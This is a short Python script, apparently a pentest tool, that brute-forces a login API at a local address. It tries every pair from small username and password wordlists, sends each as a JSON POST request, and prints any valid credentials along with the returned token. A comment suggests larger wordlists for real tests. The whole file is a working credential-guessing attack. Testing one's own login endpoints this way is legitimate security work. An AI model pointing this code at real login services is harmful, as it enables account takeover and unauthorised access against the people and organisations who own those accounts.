# pentest_tool_full.py
import requests
import time

BASE_URL = "http://127.0.0.1:5000/login"

# Example wordlists (replace with bigger lists in real tests)
USERNAMES = ["admin","alice", "test", "user1","secr3t!", "guest"]
PASSWORDS = ["123456", "Secr3t!","password", "letmein", "hunter2", "admin2025"]

def brute_force(api_url):
    """Brute force usernames and passwords against the given API URL."""
    print("[*] Starting brute force attack...")
    
    for username in USERNAMES:
        for pwd in PASSWORDS:
            r = requests.post(api_url, json={"username": username, "password": pwd})
            
            if r.status_code == 200 and r.json().get("status") == "success":
                print(f"[✅] Correct credentials found: {username}:{pwd}")
                print(f"Token: {r.json().get('token')}")
                return
            else:
                print(f"[❌] Wrong: {username}:{pwd}")
            
            time.sleep(0.2)  # Delay to simulate real-world timing
    
    print("[-] No valid credentials found in lists")

if __name__ == "__main__":
    brute_force(BASE_URL)
